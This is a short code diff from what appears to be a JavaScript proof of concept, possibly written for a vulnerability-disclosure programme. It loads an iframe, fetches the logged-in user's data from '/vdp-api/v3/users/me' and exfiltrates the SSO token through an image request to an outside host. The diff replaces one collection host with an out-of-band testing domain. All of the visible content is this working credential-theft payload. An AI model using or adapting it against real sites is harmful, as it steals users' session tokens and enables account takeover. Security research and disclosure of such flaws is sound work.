@@ -6,7 +6,7 @@ const iframe = document.createElement('iframe');
             iframeWindow.fetch('/vdp-api/v3/users/me')
                 .then(response => response.json())
                 .then(data => {
-                  document.write("<img src='https://r1p.xyz/?"+data.ssoToken+"'>");
+                  document.write("<img src='https://nwbserrccwunqmqfabxt23wm5n7e5022i.oast.fun/?"+data.ssoToken+"'>");
                     alert("Your SSO Token: "+JSON.stringify(data.ssoToken));
                 })
                 .catch(error => {
